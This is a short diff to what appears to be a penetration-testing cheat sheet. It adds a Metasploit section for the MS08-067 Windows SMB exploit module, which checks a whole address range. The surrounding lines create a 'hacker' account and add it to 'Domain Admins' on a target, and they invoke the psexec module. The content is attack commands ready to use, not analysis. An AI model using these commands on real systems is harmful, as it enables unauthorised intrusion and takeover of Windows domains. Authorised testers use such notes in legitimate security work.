@@ -228,6 +228,13 @@ add_user hacker password -h <target IP>
 add_group_user "Domain Admins" hacker -h <target IP>
 ------------------------------------------------------------------------------------------------------
 
+# MS08-067
+
+use exploit/windows/smb/ms08_067_netapi
+set THREADS 25
+check <CIDR>
+------------------------------------------------------------------------------------------------------
+
 # psexec
 
 use windows/smb/psexec
